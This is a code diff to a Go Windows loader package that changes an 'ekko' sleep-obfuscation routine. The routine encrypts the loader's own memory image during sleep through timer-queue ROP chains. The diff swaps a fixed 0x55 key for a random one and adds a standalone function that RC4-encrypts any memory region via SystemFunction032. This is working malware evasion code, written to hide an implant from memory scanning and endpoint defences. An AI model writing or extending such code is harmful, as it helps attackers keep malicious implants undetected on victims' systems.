@@ -6,6 +6,7 @@ import (
 	"log"
 	"syscall"
 	"unsafe"
+	"crypto/rand"
 	"loader/pkg/types"
 	"golang.org/x/sys/windows"
 )
@@ -149,7 +150,7 @@ func ekko(sleepTime uint64) error {
 	var RopProtRX types.CONTEXT
 	var RopSetEvt types.CONTEXT
 
-	keybuf := [16]uint8{0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55}
+	keybuf, _ := GenerateKey(16)
 
 	var Key, Img types.UString
 
@@ -160,7 +161,6 @@ func ekko(sleepTime uint64) error {
 	hEvent, _, _ := procCreateEventW.Call(0, 0, 0, 0)
 	var hNewTimer, hTimerQueue uintptr
 	hTimerQueue, _, _ = procCreateTimerQueue.Call()
-
 	Img.Buffer = (*byte)(unsafe.Pointer(ImageBase))
 	Img.Length = nt_header.OptionalHeader.SizeOfImage
 
@@ -232,4 +232,44 @@ func ekko(sleepTime uint64) error {
 	procDeleteTimerQueue.Call(hTimerQueue)
 
 	return nil
+}
+
+// EncryptMemoryRegion encrypts a memory region using SystemFunction032 (RC4)
+// This is a standalone function that can be called independently
+func EncryptMemoryRegion(baseAddr uintptr, size uint32, key []byte) error {
+	if len(key) == 0 {
+		return fmt.Errorf("key cannot be empty")
+	}
+	
+	var dataUString, keyUString types.UString
+	
+
+	dataUString.Buffer = (*byte)(unsafe.Pointer(baseAddr))
+	dataUString.Length = size
+	dataUString.MaximumLength = size
+	
+
+	keyUString.Buffer = &key[0]
+	keyUString.Length = uint32(len(key))
+	keyUString.MaximumLength = uint32(len(key))
+
+	ret, _, _ := procSystemFunction032.Call(
+		uintptr(unsafe.Pointer(&dataUString)),
+		uintptr(unsafe.Pointer(&keyUString)),
+	)
+	
+	if ret != 0 {
+		return fmt.Errorf("SystemFunction032 failed with status: 0x%X", ret)
+	}
+	
+	return nil
+}
+
+func GenerateKey(keySize int) ([]byte, error) {
+	key := make([]byte, keySize)
+	_, err := rand.Read(key)
+	if err != nil {
+		return nil, fmt.Errorf("failed to generate random key: %w", err)
+	}
+	return key, nil
 }
